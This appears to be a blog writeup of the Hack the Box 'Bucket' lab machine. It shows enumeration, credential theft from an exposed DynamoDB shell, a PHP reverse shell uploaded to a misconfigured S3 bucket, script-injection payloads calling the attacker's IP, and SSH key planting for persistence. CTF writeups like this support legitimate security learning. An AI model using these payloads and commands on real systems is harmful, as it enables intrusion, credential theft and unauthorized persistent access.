---
layout: post
layout: default
title: "HTB - Bucket"
description: "My writeup for the HacktheBox Bucket Machine. An extremely fun medium-rated machine that involved AWS Localstack and exploiting a locally hosted website"
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
---
# Hack the Box - Bucket

Contents
- [Enumeration](#enumeration)
- [Website](#website)
  - [Shell Page](#shell-page)
  - [Exfiltrating Data](#exfiltrating-data)
  - [Attacking the Bucket](#attacking-the-bucket)
  - [Uploading a Web Shell](#uploading-a-web-shell)
- [Shell as www-data](#shell-as-www-data)
- [Shell as roy](#shell-as-roy)
  - [Basic Linux Enumeration](#basic-linux-enumeration)
  - [Bucket App](#bucket-app)
    - [Accessing the Local Site](#accessing-the-local-site)
  - [Creating the Alerts Table](#creating-the-alerts-table)
  - [Creating a Malicious Alert](#creating-a-malicious-alert)
  - [Final Payload](#final-payload---downloading-root-private-key)

# Overview

I did this box back in December 2020. It was the fifth box I'd done, and only the second medium-rated box I'd tried. It took me a few days of pretty non-stop work to get User, and I had Root after a week.

I wasn't as good at taking screenshots for my notes back then, so when I converted this writeup to Obsidian I made sure to go back and get some. Therefore you may see some screenshots dated after the box retired. My IP might also change between bash commands :)

---

This is also my first writeup of a HTB box. It is also available as part of my [Cybersecurity Notes repository](https://github.com/Twigonometry/Cybersecurity-Notes), where all the pieces of the writeup link sexily together.

I'm still working out my personal style for writeups, and this one has turned out to be quite long. I enjoy writing up my thought processes and making my writeups quite detailed - mostly because, primarily, these are resources for me.

Some people might not like this style, and that is fine - snappier text writeups are available, such as those by [0xdf](https://0xdf.gitlab.io/). But if you like a bit of explanation and a narrative style, as well as seeing where people go wrong, these might be for you. I think there is a benefit to including mistakes in writeups, so we can learn from them going forwards.

---

This box was extremely fun. The initial exploit involved enumerating a webserver to discover it was linked to some AWS resources. There were then two parallel parts: interacting with a DynamoDB shell to exfiltrate some credentials, and uploading a web shell to an S3 bucket for code execution on the box.

Once you were on the box, you could use the stolen credentials to log in as the user `roy`. roy had access to a locally-hosted web app which you could access via SSH tunneling and exploit by adding a malicious entry in a database that caused the web app to read a sensitive file and convert it to a PDF.

## Ratings

I rated user a 6 for difficulty at the time, as I found the debugging of the DDB code very difficult. After revisiting the box I would probably rate it a 5, as the steps were fairly simple but just required some knowledge of AWS.

I rated root a 7 for difficulty. It involved some techniques I hadn't used before, such as SSH tunneling, and a cool custom exploitation on a web app, plus an interesting way of stealing a sensitive file via a PDF attachment which I hadn't seen before.

## Loot

These are the creds and other useful things I collected throughout this box.

**Potential emails**

support@bucket.htb

Taken from the front page of the `http://bucket.htb` website
  
**Credentials**

Taken from [Dynamo DB](#exfiltrating-data)

|username|email|
|--|--|
|Mgmt|Management@#1@#|
|Cloudadm|Welcome123!|
|Sysadm(roy)|n2vM-<\_K\_Q:.Aa2|

# Enumeration

## nmap

I started with an `nmap` scan to discover open ports:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ nmap 10.10.10.212 -sC -sV -oA nmap/  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-15 15:04 GMT  
Nmap scan report for 10.10.10.212  
Host is up (0.032s latency).  
Not shown: 998 closed ports  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)  
80/tcp open http Apache httpd 2.4.41  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux\kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
```

This shows only ports 22 and 80 are open, for SSH and HTTP. This means we should start by looking at the [website](#website)

## Gobuster

I ran gobuster on the initial website domain:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ gobuster dir -u http://10.10.10.212 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.212
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/28 12:31:01 Starting gobuster in directory enumeration mode
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.212/84530f45-4eb0-4f43-bae7-e0227949c00c => 302 (Length: 280). To continue please exclude the status code, the length or use the --wildcard switch
```

Running with the `--wildcard` switch returns a large number of `302` status codes.

When I discovered the `bucket.htb` domain, I re-ran the scan:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ gobuster dir -u http://bucket.htb --wildcard -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bucket.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/28 12:33:51 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/.htm                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 5344]
/.htaccess            (Status: 403) [Size: 275] 
/.phtml               (Status: 403) [Size: 275] 
/.htc                 (Status: 403) [Size: 275] 
/.html_var_DE         (Status: 403) [Size: 275] 
/server-status        (Status: 403) [Size: 275] 
/.htpasswd            (Status: 403) [Size: 275] 
/.html.               (Status: 403) [Size: 275] 
/.html.html           (Status: 403) [Size: 275] 
/.htpasswds           (Status: 403) [Size: 275] 
/.htm.                (Status: 403) [Size: 275] 
/.htmll               (Status: 403) [Size: 275] 
/.phps                (Status: 403) [Size: 275] 
/.html.old            (Status: 403) [Size: 275] 
/.ht                  (Status: 403) [Size: 275] 
/.html.bak            (Status: 403) [Size: 275] 
/.htm.htm             (Status: 403) [Size: 275] 
/.hta                 (Status: 403) [Size: 275] 
/.html1               (Status: 403) [Size: 275] 
/.htgroup             (Status: 403) [Size: 275] 
/.html.LCK            (Status: 403) [Size: 275] 
/.html.printable      (Status: 403) [Size: 275] 
/.htm.LCK             (Status: 403) [Size: 275] 
/.htaccess.bak        (Status: 403) [Size: 275] 
/.html.php            (Status: 403) [Size: 275] 
/.htmls               (Status: 403) [Size: 275] 
/.htx                 (Status: 403) [Size: 275] 
/.htlm                (Status: 403) [Size: 275] 
/.htm2                (Status: 403) [Size: 275] 
/.html-               (Status: 403) [Size: 275] 
/.htuser              (Status: 403) [Size: 275] 
                                                
===============================================================
2021/04/28 12:35:26 Finished
===============================================================
```

There were no useful results here.

### s3.bucket.htb

After discovering the `s3` subdomain, I ran gobuster against it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ gobuster dir -u s3.bucket.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3.bucket.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/29 13:52:34 Starting gobuster in directory enumeration mode
===============================================================
/health               (Status: 200) [Size: 54]
/shell                (Status: 200) [Size: 0] 
/server-status        (Status: 403) [Size: 278]
/shells               (Status: 500) [Size: 158]
                                               
===============================================================
2021/04/29 14:00:08 Finished
===============================================================
```

This revealed the `/health` and `shell` pages.

# Website

Visiting `http://10.10.10.212` redirects to `http://bucket.htb`. So let's add that to our hosts file:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.212    bucket.htb
```

We see this bug bounty website:

![Website Landing Page](/assets/images/blogs/Pasted image 20210428122533.png)

Looking at the source with `Ctrl + U`, we see the page's images are being requested from the domain `s3.bucket.htb`:

![Image Request Source](/assets/images/blogs/Pasted image 20210428122741.png)

So we can add this to our hosts too, and visit the URL:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.212    bucket.htb s3.bucket.htb
```

## s3.bucket.htb

We simply see the message '{"status": "running"}':

![Status Message on S3 Page](/assets/images/blogs/Pasted image 20210428122851.png)

Running [gobuster](#s3buckethtb) against the `s3` subdomain reveals the `/health` and `/shell` pages.

### Health Page

First, let's check `http://s3.bucket.htb/health`:

![Health Page displaying status of S3 and DDB](/assets/images/blogs/Pasted image 20210428123940.png)

This reveals a second service is running, strongly suggesting this box is related to Amazon Web Services (AWS). S3 is a storage service for AWS, and DynamoDB is a NoSQL-based database service.

Seeing that DynamoDB (DDB) was another service running, I wondered if there was an equivalent subdomain. I tried a number of subdomains to see if I could get a URL that corresponds to DDB:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.212    bucket.htb s3.bucket.htb dynamodb.bucket.htb db.bucket.htb ddb.bucket.htb dynamo.bucket.htb
```

However, all of these just resolved back to the main site.

### Shell Page

Navigating to `http://s3.bucket.htb/shell` redirects to a strange URL:

![Shell Page Redirects to Broken Page](/assets/images/blogs/Pasted image 20210428124114.png)

I ran this request through Burp to see what was happening:

```
HTTP/1.1 200  
Date: Tue, 15 Dec 2020 15:26:03 GMT  
Server: hypercorn-h11  
content-type: text/html; charset=utf-8  
content-length: 0  
refresh: 0; url=http://444af250749d:4566/shell/
access-control-allow-origin: \*  
access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH  
access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging  
access-control-expose-headers: x-amz-version-id  
Connection: close
```

It allows POST requests, so I tried a couple of basic requests to see if I could execute Unix commands.

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ curl -d 'cmd=id' http://s3.bucket.htb/shell
```

This returned nothing.

Then I noticed the `/` at the end of the `http://444af250749d:4566/shell/` URL. I tried appending this to the `s3` URL, and got a result:

![Dynamo DB Javascript Shell](/assets/images/blogs/Pasted image 20210428124724.png)

This seems to be a shell for interacting with DDB.

I did a lot of experimenting with the features on this page. I'll give a quick overview of what I tried rather than jumping straight to what worked. I'm hoping to do this in all of my writeups, so you can see my approach and methodology; but I don't want failed attempts to bog down my writeups, so I'll exclude syntax errors and always include a link to the [working exploit](#exfiltrating-data) if you want to skip ahead.

**Attempting to Upload a Shell**

Clicking the 'save' icon seems to allow uploading a file:

![File Upload Box](/assets/images/blogs/Pasted image 20210428130221.png)

I downloaded a [javascript shell](https://github.com/shelld3v/JSshell) from GitHub and attempted to upload one:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/js-shell/JSshell]
└─$ python3 jsh.py -s 10.10.14.92 -g
    __              
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v3.1

Payloads:  
 - SVG: <svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"},1010)>
 - SCRIPT: <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"},1010)</script>
 - IMG: <img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"},1010)>
 - BODY: <body onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"}></body>

Listening on [any] 4848 for incoming JS shell ...

```

I used the `<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"},1010)</script>` payload, and saved this to a file named `pld` before uploading it.

I then tried to hit the shell by visiting `http://s3.bucket.htb/pld`, but got no response back. I could have spent some time looking for an upload location, but had a feeling that this wasn't the correct way to go, so I moved on.

I had to use the `kill` command to close the listener using its PID, as it was unresponsive to `Ctrl + C`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/js-shell/JSshell]
└─$ ps aux | grep jsh.py
mac         4790  0.1  1.4  30140 22096 pts/5    S+   13:03   0:00 python3 jsh.py -s 10.10.14.92 -g
┌──(mac㉿kali)-[~/Documents/HTB/bucket/js-shell/JSshell]
└─$ kill -9 4790
```

**Looking for Useful SDK Functions**

I started trying to write some code using the Javascript SDK. I ran into a few issues, as it wasn't as well documented as other SDKs, but I started out with a simple attempt at listing the Dynamo Tables:

```javascript
var dynamodb = new AWS.DynamoDB();  
var param = {};  
dynamodb.listTables(param, function (err, data) {  
	if (err) console.log(err, err.stack); // an error occurred  
	else console.log(data); // successful response  
});
```

This code can be executed directly in the browser, as shown:

![Executing some Javascript SDK code](/assets/images/blogs/Pasted image 20210428131851.png)

I received the following response:

```
{"message":"The security token included in the request is invalid.","code":"UnrecognizedClientException"}
```

I tried configuring AWS STS to get a session token, as per [the STS docs](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/STS.html#getSessionToken-property):

```javascript
var dynamodb = new AWS.DynamoDB();  
var sts = new AWS.STS();
sts.getSessionToken(function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
});
var param = {};  
dynamodb.listTables(param, function (err, data) {  
	if (err) console.log(err, err.stack); // an error occurred  
	else console.log(data); // successful response  
});
```

This gave me the following error:

```
{"message":"Cannot load XML parser","code":"XMLParserError"
```

At this point I wasn't sure exactly *how* the AWS environment was configured, as it seemed local to the box. I wondered if it did actually use IAM and secret access keys for authentication, like normal AWS, or if there was something else going on. I would only figure this out after gaining a foothold on the box.

I spent a *long* time trying to debug the `XMLParserError`, which popped up in a large number of contexts, especially later on when interacting with S3. It was a badly documented error, and the most definitive answer I found was [this post](https://forums.aws.amazon.com/thread.jspa?messageID=488946) suggesting it is a bug in the configuration itself. Eventually I moved on and switched up my approach.

#### Exfiltrating Data

I suspected that there was some sort of local AWS setup powering the website, perhaps with a minimal number of services. So I did some googling around local deployments and tried to avoid official AWS docs as they interact with services that might not exist locally.

I found this [Stack Overflow Post](https://stackoverflow.com/questions/57988963/how-to-access-dynamodb-local-using-dynamodb-javascript-shell) which suggests using an 'endpoint URL' to access local resources.

I initially tried `http://bucket.htb` as the endpoint URL, as I figured it was the most generic domain. However, this gave me the following error:

```
{"message":"Network Failure","code":"NetworkingError","time":"2020-12-15T16:25:33.070Z","region":"us-west-2","hostname":"bucket.htb","retryable":true}
```

So I switched to this code, using `http://s3.bucket.htb` instead:

```javascript
var dynamodb = new AWS.DynamoDB({endpoint: '[http://s3.bucket.htb'](http://s3.bucket.htb') });  
var param = {};  
dynamodb.listTables(param, function (err, data) {  
if (err) console.log(err, err.stack); // an error occurred  
else console.log(data); // successful response  
});
```

This lets us enumerate the tables in the database!

![Console outputting table names](/assets/images/blogs/Pasted image 20210428134850.png)

Now we can scan the table. I used this code:

```javascript
var dynamodb = new AWS.DynamoDB({endpoint: 'http://s3.bucket.htb' });
var param = {
    TableName: 'users',
    Limit: 10
};
dynamodb.scan(param, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else console.log(data); // successful response
});
```

Which outputted some usernames and passwords! I took note of these in [Loot](#loot)

![Console outputting usernames and passwords JSON](/assets/images/blogs/Pasted image 20210428135105.png)

We don't have anywhere to use these creds right now. So I figured the next step was to try and attack the S3 Bucket instead.

### Attacking the Bucket

I wondered if the credentials were for the AWS CLI. I installed it with:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ sudo apt install awscli
```

I will again briefly detail my thought process here, but you can skip to the [working solution](#uploading-a-web-shell) if you like.

I then tried a basic S3 command to upload a small `.html` file to the bucket and see if I could hit it.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws s3 cp ello.html http://s3.bucket.htb

usage: aws s3 cp <LocalPath> <S3Uri> or <S3Uri> <LocalPath> or <S3Uri> <S3Uri>
Error: Invalid argument type
```

I assumed this error was because I had the incorrect bucket name. I didn't immediately know how to fix it, so I went back to the shell to see if I could enumerate some more.

#### Using the Shell Page to Hit S3

I tried to use the shell to interact with S3 and enumerate it - it is a Javascript SDK, so its functionality shouldn't be limited to DDB in theory.

I started with trying to list buckets, using the [endpoint URL](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#endpoint-property) docs again:

```javascript
var s3 = new AWS.S3({endpoint: 'http://s3.bucket.htb' });
var params = {};
 s3.listBuckets(params, function(err, data) {
   if (err) console.log(err, err.stack); // an error occurred
   else     console.log(data);           // successful response
 });
```

This gave me the `XMLParserError`, which would continue to be a running theme with the shell. I tried a number of different encodings, as well as using `ppJson()` to parse the response, but none of these solutions worked.

I tried instead to [put an object](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#putObject-property) to the bucket. This method required a Bucket Name parameter. Looking at the website source again, the images make a reference to `adserver`, which I thought could be the bucket name.

After some experimenting, I eventually got the server to respond by setting the `Bucket` property to simply `s3`:

```javascript
var s3 = new AWS.S3({endpoint: 'http://s3.bucket.htb', params: { Bucket: "s3" } });
 s3.listObjects({ Delimiter: "/" }, function(err, data) {
    if (err) {
      return console.log(err);
    } else {
        return console.log(data);
    }
 });
```

But this returned *yet another* `XMLParserError`. At this point, I switched to getting the CLI to work. However, I've included these functions in the writeup just for reference and to explain how I came to the eventual solution.

#### Using the AWS CLI

I tried again, adjusting the URL slightly to fit with the format of AWS references in other examples:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws s3 cp ello.html s3://s3.bucket.htb
upload failed: ./ello.html to s3://s3.bucket.htb/ello.html Unable to locate credentials
```

Progress! I ran `aws configure` to set some credentials. I initially tried with empty credentials.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws configure
AWS Access Key ID [None]:
AWS Secret Access Key [None]:
Default region name [None]: us-west-1
Default output format [None]: json
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws s3 cp ello.html s3://s3.bucket.htb
upload failed: ./ello.html to s3://s3.bucket.htb/ello.html An error occurred (InvalidAccessKeyId) when calling the PutObject operation: The AWS Access Key Id you provided does not exist in our records.
```

There was still a problem with our code, and it was missing one key component. After some prompting to think about an option that might mean the request no longer requires credentials, I remembered about the 'Endpoint URL' parameter in the shell.

I set the equivalent CLI parameter, `--endpoint-url`. With empty creds I got a credential error again, but after setting some arbitrary credentials we got a hit!

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws configure
AWS Access Key ID [None]: arbitrary
AWS Secret Access Key [None]: arbitrary
Default region name [us-west-1]:
Default output format [json]:
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws s3 ls --endpoint-url http://s3.bucket.htb
2021-04-28 14:41:03 adserver
```

We can now upload a test file to the adserver directory, and visit it in the browser:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws s3 cp test.txt s3://adserver/images/test.txt --endpoint-url http://s3.bucket.htb
upload: ./test.txt to s3://adserver/images/test.txt
```

![Visiting our basic text file in browser](/assets/images/blogs/Pasted image 20210428143658.png)

Awesome!

Now we can try a PHP shell. I tried the shell located at `/usr/share/webshells/php/php-reverse-shell.php`, uploading it with `aws s3 cp phprs.php s3://adserver/images/test.php --endpoint-url http://s3.bucket.htb` and then visiting `http://s3.bucket.htb/adserver/images/test.php`

I didn't get a hit to my listener. I tried a few payloads here, including a `.html` file with a `<?php ?>` section, which revealed that PHP was not being rendered on the page.

I then tried an alternative Javascript web shell, downloaded from [https://gist.github.com/substack/7349970](https://gist.github.com/substack/7349970). However, this also didn't work.

I figured that perhaps I needed to upload to the `s3` subdomain, and then trigger the payload on the main URL. I considered a few things:
- somehow specifying two endpoints, one being the `bucket.htb` domain and the other being the `s3` subdomain
- overwriting one of the images on the adserver bucket with a malicious png
- trying to trigger the shell on the `bucket.htb` domain, by visiting `http://    bucket.htb/adserver/malicious-file`
- trying different methods of accessing the shell, such as `curl`, in case some strange browser behaviour was preventing it from being triggered

However, the answer turned out to be much simpler. I was just uploading to the wrong location on the bucket, revealed by simply listing its contents:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws --endpoint-url http://s3.bucket.htb s3 ls
2020-12-18 19:16:03 adserver
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws --endpoint-url http://s3.bucket.htb s3 ls adserver
                           PRE images/
2020-12-18 19:16:04       5344 index.html
```

The webserver is hosted out of the `adserver` directory on the bucket (which makes sense with hindsight). This essentially means files at `http://s3.bucket.htb/adserver/directory/file` are mapped to `http://bucket.htb/directory/file` on the main website.

Strangely, visiting `http://bucket.htb/images/malware.png` returns an error, which is what originally threw me off and led me down a rabbit hole.

![Apache page showing image is not found](/assets/images/blogs/Pasted image 20210428154235.png)

It is possible that only files in the top level directory are accessible this way - but either way, we now know what to do!

#### Uploading a Web Shell

So, the command to upload a shell is simply:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws s3 cp phprs.php s3://adserver/ --endpoint-url http://s3.bucket.htb 
upload: ./phprs.php to s3://adserver/phprs.php
```

Then we execute the shell by starting a netcat listener and visiting the URL:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.10.212] 42766
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:58:18 up  4:38,  0 users,  load average: 0.12, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

This can be a bit temperamental - sometimes requesting the shell at `http://bucket.htb/phprs.php` returns a 404 status code. However, you just need to keep trying until it works. To check your shell has actually uploaded, you can use `s3 ls`, and copy and paste the filename just to be sure:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws s3 ls adserver --endpoint-url http://s3.bucket.htb
                           PRE images/
2021-04-29 09:57:04       5344 index.html
2021-04-29 09:57:47       5492 phprs.php
```

# Shell as www-data

We managed to pop our shell from the bucket, and can see we are the `www-data` user:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.10.212] 42766
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:58:18 up  4:38,  0 users,  load average: 0.12, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now let's upgrade our shell, using the backgrounding shell trick:

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bucket:/$ ^Z  
[1]+  Stopped                 nc -lnvp 9001
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ stty raw -echo
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
nc -lnvp 9001

www-data@bucket:/$ 
```

## Enumeration

Looking around the root directory, we see an `.aws` folder, which I know from experience contains credentials:

```bash
www-data@bucket:/$ cd .aws
www-data@bucket:/.aws$ ls
config	credentials
www-data@bucket:/.aws$ cat credentials
cat: credentials: Permission denied
```

However we cannot read it.

Going to the home directory, we see a new folder called `bucket-app`. This is also root-only readable, but has a mysterious `+` next to it.

```bash
www-data@bucket:/.aws$ cd ~
www-data@bucket:/var/www$ ls -la
total 16
drwxr-xr-x   4 root root 4096 Feb 10 12:29 .
drwxr-xr-x  14 root root 4096 Feb 10 12:29 ..
drwxr-x---+  4 root root 4096 Feb 10 12:29 bucket-app
drwxr-xr-x   2 root root 4096 Apr 29 09:07 html
```

When I first did this box, I tried looking for a user to escalate to with the credentials I had found in DDB. I did this by listing the contents of the `/home` directory, and found the `/home/roy` directory.

Other ways of discovering `roy` included:
- Running `cat /etc/passwd` to list the users on the box
- Running `getfacl bucket-app` to view the access control list on the `bucket-app` directory

The `+` next to the filename is what indicates we can do the latter - it shows there is an extra permission on the file besides the usual `rwx` permissions of Linux - this is usually an Access Control List, or ACL, and can be read with the `getfacl` command:

```bash
www-data@bucket:/var/www$ getfacl bucket-app
# file: bucket-app
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
```

This shows us the `roy` user.

## Escalating to Roy

We can now attempt to switch user to `roy`. I tried every [password that we leaked](#loot), and found that `n2vM-<_K_Q:.Aa2` worked:

```bash
www-data@bucket:/var/www$ su roy
Password: 
roy@bucket:/var/www$
```

We can now attempt to SSH in as roy using this password:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ ssh roy@10.10.10.212
The authenticity of host '10.10.10.212 (10.10.10.212)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.212' (ECDSA) to the list of known hosts.
roy@10.10.10.212's password: 

...[snip]...

  System information as of Thu 29 Apr 2021 09:16:39 AM UTC

  System load:                      0.09
  Usage of /:                       33.6% of 17.59GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        240
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:f4a2


...[snip]...

Last login: Wed Sep 23 03:33:53 2020 from 10.10.14.2
roy@bucket:~$ 
```

Success! We can now abandon our painfully laggy PHP reverse shell and use SSH instead. The login banner also gave us some potentially useful information, so I've included it in the notes.

### SSH Persistence

If for some reason the password did not work here, we could instead try to drop our own SSH key for persistence. This is actually what I did when I originally solved the box. If roy had a `.ssh` folder we could save his `id_rsa` file to our box and use it to connect, which is better for OpSec. However, he did not, so instead we can upload our own.

On our local machine we can create an SSH key pair.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ ssh-keygen -f roy
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ cat roy.pub 
ssh-rsa AAAAB3...[snip]...+Ol9tVADE= mac@kali
```

On the remote machine, create a `.ssh` directory and add our public key to the authorized keys file:

```bash
roy@bucket:~$ mkdir .ssh
roy@bucket:~$ echo 'ssh-rsa AAAAB3...[snip]...+Ol9tVADE= mac@kali' > .ssh/authorized_keys
```

# Shell as roy
First, let's grab the user flag:

```bash
roy@bucket:~$ ls
project  user.txt
roy@bucket:~$ cat user.txt 
4dd0d95b7d4d3ae734486bee60548a17
```

Then we can look in the `project` directory:

```bash
roy@bucket:~$ cd project
roy@bucket:~/project$ ls -la
total 44
drwxr-xr-x  3 roy roy  4096 Sep 24  2020 .
drwxr-xr-x  4 roy roy  4096 Apr 29 09:16 ..
-rw-rw-r--  1 roy roy    63 Sep 24  2020 composer.json
-rw-rw-r--  1 roy roy 20533 Sep 24  2020 composer.lock
-rw-r--r--  1 roy roy   367 Sep 24  2020 db.php
drwxrwxr-x 10 roy roy  4096 Sep 24  2020 vendor
roy@bucket:~/project$ cat db.php 
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
```

I was hoping for a password, but it seems there isn't much of interest here.

## Basic Linux Enumeration

I ran some basic commands to see what was happening on the box.

### Processes

`ps aux` showed us that [localstack](https://github.com/localstack/localstack) was running as root - this is the program that is being used to create the local AWS infrastructure.

```bash
roy@bucket:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND

...[snip]...

root        1481  0.0  0.0   1568     4 ?        S    04:19   0:01 tail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err
root        1505  0.0  0.0   1156   668 ?        S    04:19   0:00 make infra
root        1506  0.4  3.4 144656 137396 ?       Sl   04:19   1:20 python bin/localstack start --host
```

It turns out `localstack` does actually support IAM, but I suppose somehow this box was configured not to use IAM credentials.

### Network Connections

`netstat` shows some local connections (namely port 4566, which hosts the 'edge service' for `localstack`) and outgoing connections to my box.

```bash
roy@bucket:/var/www/bucket-app$ netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      1 10.10.10.212:32934      1.0.0.1:domain          SYN_SENT   
tcp        0      0 localhost:4566          localhost:57954         TIME_WAIT  
tcp        0      0 localhost:4566          localhost:57960         TIME_WAIT  
tcp        0      0 10.10.10.212:42766      10.10.14.65:9001        ESTABLISHED
tcp        0    300 10.10.10.212:ssh        10.10.14.65:46656       ESTABLISHED
tcp6       1      0 10.10.10.212:http       10.10.14.65:33984       CLOSE_WAIT 
